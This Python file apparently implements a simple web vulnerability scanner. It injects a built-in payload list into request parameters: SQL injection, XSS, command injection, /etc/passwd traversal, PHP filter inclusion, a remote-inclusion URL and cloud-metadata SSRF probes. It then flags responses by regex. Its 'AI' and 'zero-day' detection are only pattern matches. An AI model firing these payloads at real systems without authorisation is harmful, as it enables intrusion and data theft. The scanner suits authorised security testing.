# Advanced Vulnerability Assessment Agent
from __future__ import annotations

import asyncio
import base64
import logging
import re
import time
import urllib.parse
import uuid
from dataclasses import dataclass
from datetime import datetime, timedelta
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

import requests
from bs4 import BeautifulSoup

logger = logging.getLogger(__name__)


class VulnerabilityType(Enum):
    SQL_INJECTION = "sql_injection"
    XSS_REFLECTED = "xss_reflected"
    XSS_STORED = "xss_stored"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    XXE = "xxe"
    SSRF = "ssrf"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    AUTHORIZATION_BYPASS = "authorization_bypass"
    BUSINESS_LOGIC = "business_logic"
    SECURITY_MISCONFIGURATION = "security_misconfiguration"
    INJECTION_OTHER = "injection_other"
    ZERO_DAY = "zero_day"
    UNKNOWN = "unknown"


class SeverityLevel(Enum):
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


@dataclass
class VulnerabilityFinding:
    id: str
    target_id: str
    vulnerability_type: VulnerabilityType
    severity: SeverityLevel
    title: str
    description: str
    location: str
    parameter: str
    payload: str
    evidence: str
    impact: str
    remediation: str
    cvss_score: float
    cvss_vector: str
    cwe_id: str
    owasp_category: str
    confidence: float
    false_positive_probability: float
    exploit_complexity: str
    attack_vector: str
    privileges_required: str
    user_interaction: str
    scope: str
    confidentiality_impact: str
    integrity_impact: str
    availability_impact: str
    technical_details: Dict[str, Any]
    reproduction_steps: List[str]
    references: List[str]
    discovered_at: datetime
    verified: bool
    exploitable: bool


class AIVulnerabilityDetector:
    """AI-powered vulnerability detection engine"""
    
    def __init__(self):
        self.patterns = self._initialize_patterns()
    
    def _initialize_patterns(self) -> List[Dict[str, Any]]:
        """Initialize vulnerability detection patterns"""
        return [
            {
                'type': VulnerabilityType.SQL_INJECTION,
                'patterns': [
                    r'SQL syntax.*error',
                    r'mysql_fetch_array\(\)',
                    r'ORA-\d+:',
                    r'Microsoft.*ODBC.*error',
                    r'PostgreSQL.*ERROR'
                ],
                'severity': SeverityLevel.HIGH
            },
            {
                'type': VulnerabilityType.XSS_REFLECTED,
                'patterns': [
                    r'<script[^>]*>.*alert\(.*\).*</script>',
                    r'javascript:alert\(',
                    r'onerror\s*=\s*["\']?alert\('
                ],
                'severity': SeverityLevel.HIGH
            }
        ]
    
    def analyze_response(self, url: str, payload: str, response_text: str) -> List[VulnerabilityFinding]:
        """Analyze response for vulnerability indicators"""
        findings = []
        
        for pattern_group in self.patterns:
            for pattern in pattern_group['patterns']:
                if re.search(pattern, response_text, re.IGNORECASE):
                    finding = VulnerabilityFinding(
                        id=str(uuid.uuid4()),
                        target_id="unknown",
                        vulnerability_type=pattern_group['type'],
                        severity=pattern_group['severity'],
                        title=f"{pattern_group['type'].value} detected",
                        description=f"Pattern match for {pattern_group['type'].value}",
                        location=url,
                        parameter="unknown",
                        payload=payload,
                        evidence=f"Pattern matched: {pattern}",
                        impact="Potential security vulnerability",
                        remediation="Investigate and apply appropriate fixes",
                        cvss_score=7.0,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                        cwe_id="CWE-unknown",
                        owasp_category="Unknown",
                        confidence=0.7,
                        false_positive_probability=0.3,
                        exploit_complexity="Medium",
                        attack_vector="Network",
                        privileges_required="None",
                        user_interaction="None",
                        scope="Unchanged",
                        confidentiality_impact="High",
                        integrity_impact="None",
                        availability_impact="None",
                        technical_details={},
                        reproduction_steps=[],
                        references=[],
                        discovered_at=datetime.now(),
                        verified=False,
                        exploitable=False
                    )
                    findings.append(finding)
        
        return findings


class VulnerabilityAgent:
    """Main vulnerability assessment agent"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config or {}
        self.ai_detector = AIVulnerabilityDetector()
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        
        # Network settings
        self.verify_ssl: bool = bool(self.config.get("verify_ssl", False))
        self.default_timeout: int = int(self.config.get("timeout", 20))
        
        # Payload database
        self.payloads = self._load_payloads()
        
        # Collected findings
        self.findings: List[VulnerabilityFinding] = []
        
        logger.info("Vulnerability Agent initialized")
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load concise, high-signal payloads for quick assessment"""
        return {
            "sql_injection": [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "admin'--",
                "1 OR 1=1--",
                "' UNION SELECT NULL--",
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "'\"onfocus=alert('XSS') autofocus",
            ],
            "command_injection": [
                "; id",
                "| whoami",
                "&& uname -a",
                "$(id)",
            ],
            "path_traversal": [
                "../../etc/passwd",
                "..\\..\\boot.ini",
                "..%2f..%2fetc/passwd",
            ],
            "lfi": [
                "../../../../etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
            ],
            "rfi": [
                "http://example.com/evil.txt",
            ],
            "ssrf": [
                "http://127.0.0.1:80/",
                "http://169.254.169.254/latest/meta-data/",
            ],
            "header_injection": [
                "\r\nX-Injection: 1",
            ],
        }
    
    def analyze_text_response(self, url: str, payload: str, response_text: str) -> List[VulnerabilityFinding]:
        """Analyze a given response body and return findings using the AI detector"""
        findings = self.ai_detector.analyze_response(url=url, payload=payload, response_text=response_text)
        self.findings.extend(findings)
        return findings
    
    def _send(self, method: str, url: str, *, params: Optional[Dict[str, Any]] = None,
              data: Optional[Dict[str, Any]] = None, headers: Optional[Dict[str, str]] = None) -> Tuple[int, str]:
        """Send HTTP request safely and return (status_code, text)"""
        try:
            resp = self.session.request(
                method=method.upper(),
                url=url,
                params=params,
                data=data,
                headers=headers,
                timeout=self.default_timeout,
                verify=self.verify_ssl,
                allow_redirects=True,
            )
            return resp.status_code, resp.text or ""
        except requests.RequestException as e:
            logger.debug(f"Request error for {url}: {e}")
            return 0, str(e)
    
    def scan_url(self, url: str, *, categories: Optional[List[str]] = None,
                 methods: Optional[List[str]] = None,
                 param_name: str = "q") -> List[VulnerabilityFinding]:
        """Quick scan by injecting payloads into a single parameter for GET/POST"""
        selected_categories = categories or [
            "sql_injection", "xss", "command_injection", "path_traversal"
        ]
        methods = [m.upper() for m in (methods or ["GET", "POST"])]
        
        results: List[VulnerabilityFinding] = []
        for cat in selected_categories:
            for payload in self.payloads.get(cat, []):
                for m in methods:
                    if m == "GET":
                        status, text = self._send("GET", url, params={param_name: payload})
                    elif m == "POST":
                        status, text = self._send("POST", url, data={param_name: payload})
                    else:
                        continue
                    findings = self.analyze_text_response(url, payload, text)
                    results.extend(findings)
        return results
    
    def scan_parameters(self, url: str, base_params: Dict[str, Any], *,
                        categories: Optional[List[str]] = None, method: str = "GET") -> List[VulnerabilityFinding]:
        """Scan by injecting payloads into each provided parameter (one at a time)"""
        selected_categories = categories or [
            "sql_injection", "xss", "command_injection", "path_traversal"
        ]
        method = method.upper()
        
        results: List[VulnerabilityFinding] = []
        for key in base_params:
            original_value = base_params[key]
            for cat in selected_categories:
                for payload in self.payloads.get(cat, []):
                    params = dict(base_params)
                    params[key] = f"{original_value}{payload}"
                    if method == "GET":
                        status, text = self._send("GET", url, params=params)
                    elif method == "POST":
                        status, text = self._send("POST", url, data=params)
                    else:
                        continue
                    findings = self.analyze_text_response(url, payload, text)
                    results.extend(findings)
        return results
    
    def detect_zero_day_vulnerability(self, content: str, *, location: Optional[str] = None) -> Optional[VulnerabilityFinding]:
        """Heuristic stub for zero-day detection"""
        if re.search(r"(Traceback|NullPointerException|ReferenceError|TypeError: Cannot)", content, re.I):
            finding = VulnerabilityFinding(
                id=str(uuid.uuid4()),
                target_id="unknown",
                vulnerability_type=VulnerabilityType.UNKNOWN,
                severity=SeverityLevel.MEDIUM,
                title="Potential Zero-Day Vulnerability",
                description="Unhandled exception or stack trace suggests potential zero-day surface",
                location=location or "unknown",
                parameter="unknown",
                payload="unknown",
                evidence="stack_trace_indicator",
                impact="Unknown - requires investigation",
                remediation="Investigate error patterns and apply appropriate fixes",
                cvss_score=6.0,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
                cwe_id="CWE-unknown",
                owasp_category="Unknown",
                confidence=0.6,
                false_positive_probability=0.4,
                exploit_complexity="Unknown",
                attack_vector="Network",
                privileges_required="None",
                user_interaction="None",
                scope="Unchanged",
                confidentiality_impact="Low",
                integrity_impact="Low",
                availability_impact="Low",
                technical_details={},
                reproduction_steps=[],
                references=[],
                discovered_at=datetime.now(),
                verified=False,
                exploitable=False
            )
            self.findings.append(finding)
            return finding
        return None
    
    def get_findings(self) -> List[VulnerabilityFinding]:
        """Return all accumulated findings"""
        return list(self.findings)
    
    def reset_findings(self) -> None:
        """Clear collected findings"""
        self.findings.clear()


# Main execution
if __name__ == "__main__":
    async def main():
        # Example usage
        target_info = {
            'url': 'https://example.com',
            'technology_stack': {
                'frontend': 'React',
                'backend': 'Node.js',
                'database': 'MySQL'
            }
        }
        
        agent = VulnerabilityAgent({"verify_ssl": False, "timeout": 20})
        
        # Test basic scanning
        findings = agent.scan_url(target_info['url'])
        
        # Print results
        print(f"\n=== VULNERABILITY ASSESSMENT RESULTS ===")
        print(f"Target: {target_info['url']}")
        print(f"Total findings: {len(findings)}")
        
        for finding in findings:
            print(f"\n[{finding.severity.value.upper()}] {finding.title}")
            print(f"  Location: {finding.location}")
            print(f"  Parameter: {finding.parameter}")
            print(f"  CVSS Score: {finding.cvss_score}")
            print(f"  Confidence: {finding.confidence:.2f}")
            print(f"  Evidence: {finding.evidence}")
    
    # Run the async main function
    asyncio.run(main())
        